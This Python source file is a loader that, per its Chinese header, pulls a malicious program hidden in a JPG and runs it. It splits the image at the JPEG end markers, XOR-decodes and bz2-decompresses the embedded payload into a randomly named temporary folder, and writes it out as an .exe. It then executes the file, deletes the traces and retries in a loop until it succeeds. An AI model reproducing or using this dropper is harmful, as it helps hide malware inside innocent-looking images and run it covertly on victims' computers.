#######################################################################################
#
#   解析JPG图片中嵌入的恶意程序并运行
#
#######################################################################################
import os, bz2, time, subprocess, shutil, random, string


# 设置
class SETTINGS():
    JPG_NAME = 'malwareJPG.jpg'
    OUT_FILE = "malware_test.exe"
    PUPLIC_KEY = b'!AbdUlkadiR%+39608]gunGor[{'  # 公钥
    PRIVATE_NUMBER = 19
    BUFFER = 1024
    WAIT_TIME = 0.1


# 创建临时文件夹
class RandomTmp:
    def __init__(self):
        self.__topfolder = None
        self.__subfolder = None
        self.__files = []
        self.__iserror = False
        cn = random.sample(string.digits + string.ascii_uppercase, k=12)
        dn = random.sample(string.digits, k=4)
        ucn = random.sample(string.ascii_uppercase, k=8)
        directory0 = ucn[0] + cn[0] + dn[0] + cn[1] + cn[2] + cn[3] + cn[4] + ucn[1] + "-"
        directory0 += ucn[2] + cn[5] + dn[1] + ucn[3] + "-"
        directory0 += ucn[4] + dn[2] + cn[6] + ucn[5] + "-"
        directory0 += ucn[6] + cn[7] + cn[8] + cn[9] + cn[10] + dn[3] + cn[11] + ucn[7]
        del cn, dn, ucn
        cn = random.sample(string.digits + string.ascii_lowercase, k=6)
        dn = random.sample(string.digits, k=2)
        lcn = random.sample(string.ascii_uppercase, k=3)
        directory1 = lcn[0] + dn[0] + cn[0] + cn[1] + cn[2] + cn[3] + cn[4] + lcn[1] + "." + cn[5] + dn[1] + lcn[2]
        del cn, dn, lcn
        try:
            # self.__topfolder = os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + directory0
            self.__topfolder = "D:\\AllFile\\LearningFile\\Code\python\BlazePigeon\\cheat_client\\Test" + directory0
            os.mkdir(self.__topfolder)
            self.__subfolder = self.__topfolder + "\\" + directory1
            os.mkdir(self.__subfolder)
        except:
            self.__iserror = True
        del directory0, directory1

    #
    def directoryPath(self):
        if self.__iserror:
            return False, ""
        else:
            return True, self.__subfolder

    #
    def createFilename(self):
        nn = random.sample(string.digits + string.ascii_lowercase, k=28)
        name = nn[0] + nn[1] + nn[2] + nn[3] + nn[4] + nn[5] + nn[6] + nn[7]
        name += nn[8] + nn[9] + nn[10] + nn[11] + nn[12] + nn[13] + nn[14] + nn[15]
        name += nn[16] + nn[17] + nn[18] + nn[19] + nn[20] + nn[21] + nn[22] + nn[23]
        name += "." + nn[24] + nn[25] + "bin" + nn[26] + nn[27]
        if self.__iserror:
            return False, ""
        else:
            tmp = self.__subfolder + "\\" + name
            self.__files.append(tmp)
            return True, tmp

    #
    def addFilename(self, file: str):
        if self.__iserror:
            return False, ""
        else:
            tmp = self.__subfolder + "\\" + file
            self.__files.append(tmp)
            return True, tmp

    #
    def finish(self):
        self.__iserror = True
        for f_name in self.__files:
            try:
                os.remove(f_name)
            except:
                pass
        self.__files = []
        try:
            shutil.rmtree(self.__subfolder, ignore_errors=False, onerror=None)
        except:
            pass
        self.__subfolder = ""
        try:
            shutil.rmtree(self.__topfolder, ignore_errors=False, onerror=None)
        except:
            pass
        self.__topfolder = ""

    #
    def __del__(self):
        self.finish()


#
def bytesXOR(plain_text, public_key, private_number):
    public_number = 3
    private_key = b'#$0aSpYt3ehR7%|\&/*QVzX12}-'     # 私钥
    len_key = len(public_key)
    public_encoded = []
    result_encoded = []
    return_encoded = []
    for i in range(0, len(plain_text)):
        public_encoded.append(plain_text[i] ^ public_key[(i + public_number) % len_key])
    private_encoded = bytes([b ^ len(private_key) for b in (bytes(public_encoded))])
    for i in range(0, len(private_encoded)):
        result_encoded.append(private_encoded[i] ^ private_key[(i + private_number) % len_key])
    for i in range(0, len(result_encoded)):
        return_encoded.append(result_encoded[i] ^ public_key[(i + public_number) % len_key])
    return bytes(return_encoded)


#
def runMalware(settings):
    try:
        cd = RandomTmp()
        cd2 = RandomTmp()
        buffer0 = cd.createFilename()[1]
        buffer1 = cd.createFilename()[1]
        buffer2 = cd.createFilename()[1]
        out_file = cd2.addFilename(file=(settings.OUT_FILE))[1]
    except:
        return False
    #
    try:
        if buffer0 == "" or buffer1 == "" or buffer2 == "" or out_file == "":
            return False
        with open(file=settings.JPG_NAME, mode='rb') as readfile:
            rb = readfile.read()
            rb_list = rb.split(sep=b"\xff\xd9")
            del rb
        if len(rb_list) < 3:
            return False
        else:
            if len(rb_list) == 3:
                payload = rb_list[1]
            else:
                payload = b''
                for ii in range(1, (len(rb_list) - 1)):
                    if ii == 1:
                        payload += rb_list[ii]
                    else:
                        payload += (b'\xff\xd9' + rb_list[ii])
        del rb_list
        # os.remove(settings.JPG_NAME)
        time.sleep(settings.WAIT_TIME)
        #
        with open(file=buffer0, mode='wb') as wfile:
            wfile.write(payload)
            del payload
        with open(file=buffer0, mode='rb') as rfile:
            with open(file=buffer1, mode='wb') as wfile:
                while True:
                    data = rfile.read(settings.BUFFER)
                    if data == b'':
                        break
                    wfile.write(bytesXOR(data, settings.PUPLIC_KEY, settings.PRIVATE_NUMBER))
        os.remove(buffer0)
        with bz2.open(filename=buffer1, mode='rb') as rfile:
            with open(file=buffer2, mode='wb') as wfile:
                while True:
                    data = rfile.read(settings.BUFFER)
                    if data == b'':
                        break
                    wfile.write(data)
        os.remove(buffer1)
        if not os.access(buffer2, os.F_OK):
            return False
        if os.access(out_file, os.F_OK):
            os.remove(out_file)
        try:
            shutil.copy2(buffer2, out_file)
        except:
            return False
        if not os.access(out_file, os.F_OK):
            return False
        #
        cd.finish()
        time.sleep(settings.WAIT_TIME)
        subprocess.run([out_file])
        time.sleep(settings.WAIT_TIME)
        cd2.finish()
        time.sleep(settings.WAIT_TIME)
        return True
    except:
        return False


if __name__ == '__main__':
    while True:
        try:
            res = runMalware(SETTINGS)
            if res:
                break
        except:
            pass
        time.sleep(1)
